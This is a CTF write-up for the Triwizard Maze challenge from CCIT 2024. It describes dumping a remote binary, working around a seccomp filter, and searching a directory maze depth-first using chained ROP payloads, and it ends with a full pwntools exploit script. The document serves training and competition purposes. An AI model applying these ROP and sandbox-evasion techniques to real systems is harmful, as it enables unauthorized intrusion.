# Overview
``` poetry
Midway upon the journey of our life
I found myself within a dark maze 😱
For the straightforward path had been lost.
But luckly i had my ropping skills help me out 👻
```

**Challenge:** [Triwizard Maze](https://external.open.ecsc2024.it/challenges#challenge-16)  (CCIT 2024 Local Finals)
**TL;DR:** Diving into the Triwizard Tournament with a Depth First Search through a folder maze using multiple ROP chains. 
# Introduction
Hold onto your wands, witches and wizards! 🪄 This Harry Potter-themed challenge, inspired by the Triwizard Tournament, has us navigating a _maze_ like true champions. 
Upon execution, the binary conjures a folder maze in `/tmp` and hides the _cup_ (a file containing the flag) deep within. The program then throws up a seccomp filter, blocking most syscalls (including `execve`), and reads a user-supplied ROP chain, handing over control to your wizardly skills to find and capture the cup! 🏆
# Dumping the Binary
The challenge doesn't give us the binary file outright, but instead provides a remote address to connect to. Once connected, the challenge greets us and informs us that this is a 32-bit binary with a custom print function at address `0x13371f2b`. This function takes a buffer and the number of bytes we want to print as inputs. 

After giving us this information, the program asks for an input of exactly 1024 bytes containing the ROP chain. Once read, it returns to execute the chain. 
By calculating the starting address of the memory page this function resides in, we can print the content of the entire page, which happens to include the entire binary. 

Once dumped the binary we can analyze it using IDA or ghidra, the program contains no libc and only has some custom functions and wrappers around some syscalls. As mentioned before, the program first crates a folder maze and then sets up a seccomp filter.
# Seccomp Filter
We can use seccomp-tools to analyze the filter. Running it gives us the following output:
```
0000: A = arch 0001: if (A != ARCH_I386) goto 0011 
0002: A = sys_number 
0003: if (A == readdir) goto 0012 
0004: if (A == read) goto 0012 
0005: if (A == write) goto 0012 
0006: if (A == close) goto 0012 
0007: if (A == exit) goto 0012 
0008: if (A != openat) goto 0011 
0009: A = filename # openat(dfd, filename, flags, mode) 0010: if (A == 0x13375d60) goto 0012 
0011: return KILL 
0012: return ALLOW`
```

The allowed syscalls are: `readdir`, `read`, `write`, `close`, `exit`, and `openat`.
`Openat` has a strange constraint: it will only execute if the filename is the specific buffer `0x13375d60`. We'll see how this comes into play later. 
# Readdir
The `readdir` syscall populates a struct with relevant information about the folder:
```c
struct old_linux_dirent {
    long  d_ino;              /* inode number */
    off_t d_off;              /* offset to this _old_linux_dirent_ */
    unsigned short d_reclen;  /* length of this _d_name_ */
    char  d_name[NAME_MAX+1]; /* filename (null-terminated) */
}
```
The key piece here is `d_name`, which stores the name of a file in the folder. To get all filenames, we need to keep calling this syscall without closing the associated file descriptor. When all filenames are listed, calling the syscall again will just return the last filename, signaling that we have the entire folder content. 
Note: This syscall will always return `.` and `..` as the first two filenames.
# The Big Plan
We'll use `openat`, `readdir`, and `close` to explore the maze using Depth First Search (DFS). For each folder, we'll make the binary print its content and then parse it in Python until we find the file containing the flag. Each ROP chain will include the instructions we want to execute and always end with a return to the binary function that reads the ROP chain and then jumps to it. This way, we can send as many chains as needed.
# `openat` and Its Strange Constraint

The first thing I tried once I understood what to do was to use `openat` to open the current folder and then call a DFS to list all the subfolders and recursively open all of them using an absolute path from the current folder.

Unfortunately, this approach doesn't work for two main reasons:

1. At address `0x13375e60`, the pointer to the buffer where the ROP chain is read by the binary is stored. This means that if the filename we try to open is longer than 256 bytes, we would overwrite this pointer. 
   However, we can easily solve this by leaking this pointer each time we run the binary and rewriting it before calling the binary function that reads the ROP chain.
2. Although not obvious at first glance, `0x13375d60` is an address at the border of a memory page. There are "only" 672 bytes available before the memory page ends. While this might not seem like a problem, since we're exploring a folder maze, the path of a file opened relative to the current working directory will eventually exceed this length.

Due to the second reason in particular, we will open each folder relative to its parent. This way, the path name will always be short enough to avoid breaking these constraints.

# Executing the Plan
With all that said, here is the final exploit: for each folder, we will call `readdir` 12 times, since this is the maximum number of children a folder can have. This can be determined by reversing the function of the binary that creates the folders or simply by running the binary a few times and checking the maximum number of subfolders in a folder.

```python
#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
context.binary = exe = ELF('./dump')
DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc triwizard-maze.challs.cyberchallenge.it 38202"	# `nc <host> <port>`

from pwnlib.tubes.tube import tube
tube.s		= tube.send
tube.sa		= tube.sendafter
tube.sl		= tube.sendline
tube.sla	= tube.sendlineafter
tube.r		= tube.recv
tube.ru		= tube.recvuntil
tube.rl		= tube.recvline

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
vleak = lambda valname, val: log.info(f"{valname}: 0x{val:x}")
chunks = lambda data, step: [data[i:i+step] for i in range(0, len(data), step)]

GDB_SCRIPT = """
set follow-fork-mode parent
"""

def conn():
    if args.REMOTE:
        return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT, aslr = True, env={"FLAG": "fake{flag}"})
    if args.DOCKER:
        return remote("localhost", DOCKER_PORT)
    return process([exe.path], env={"FLAG": "fake{flag}"})

BASE = 0x13370000
PRINT = BASE + 0x2d29
READ_CHAIN = BASE + 0x1f47
READ = BASE + 0x2edc 
SYSCALL = BASE + 0x22cd
BREAKLINE = 0x133746F0
BUFF = 0x13375d60
ENTRYNAME = 0x13375d6a
CHAIN_PROMPT = b'Give me your x86 32bit ROP chain (exactly 1024 bytes):\n'
MAX_CHILDREN = 12

sendpayload = lambda io, payload: io.sa(CHAIN_PROMPT, payload.ljust(1024, b'\x00')) if len(payload) <= 1024 else log.error("Payload too long")

def sys_exit(io, status):
    rop = ROP(exe)
    rop.call(SYSCALL, [1, status, 0, 0])
    
    sendpayload(io, rop.chain())
    exit(69)


def sys_open(io, parent, path):
    rop = ROP(exe)
    rop.call(READ, [0, BUFF, len(path)+1])
    rop.call(SYSCALL, [295, parent, BUFF, 0])
    rop.call(READ_CHAIN)

    sendpayload(io, rop.chain())
    io.s(path+b'\x00')


def sys_close(io, fd):
    rop = ROP(exe)
    rop.call(SYSCALL, [6, fd, 0, 0])
    rop.call(READ_CHAIN)
    sendpayload(io, rop.chain())


def read_dir(io, dir):
    rop = ROP(exe)
    for _ in range(MAX_CHILDREN):
        rop.call(SYSCALL, [89, dir, BUFF, 69420])
        rop.call(PRINT, [ENTRYNAME])
        rop.call(PRINT, [BREAKLINE])
    rop.call(READ_CHAIN)

    sendpayload(io, rop.chain())
    
    subdirs = [b'']
    for _ in range(MAX_CHILDREN):
        if (dir:=io.rl().strip()) != subdirs[-1]:
            subdirs.append(dir)
    return subdirs[3:] #skip '' '.' '..'


def read_flag(io, dir, flag_file):
    sys_open(io,dir, flag_file)

    rop = ROP(exe)
    rop.call(SYSCALL, [3, dir+1, BUFF, 200])
    rop.call(PRINT, [BUFF])
    rop.call(READ_CHAIN)

    sendpayload(io, rop.chain())
    log.critical(io.ru(b'}').decode())
    sys_exit(io, 69)


def DFS(io, parent=2, depth=0):
    if not hasattr(DFS, "counter"):
        DFS.counter, DFS.logger = 0 , log.progress(f'Walking through the maze... ')
    DFS.counter+=1 
    DFS.logger.status(f'Depth: {depth}, DFScount: {DFS.counter}')

    subdirs = read_dir(io, parent)

    if b'triwizard_cup' in subdirs:
        read_flag(io,parent, b'triwizard_cup')
    
    for subdir in subdirs:
        sys_open(io, parent, subdir)
        DFS(io, parent+1, depth+1)
        sys_close(io, parent+1)


def main():
    io = conn()

    sys_open(io, -100, b'entry')
    DFS(io)


if __name__ == "__main__":
    main()


```
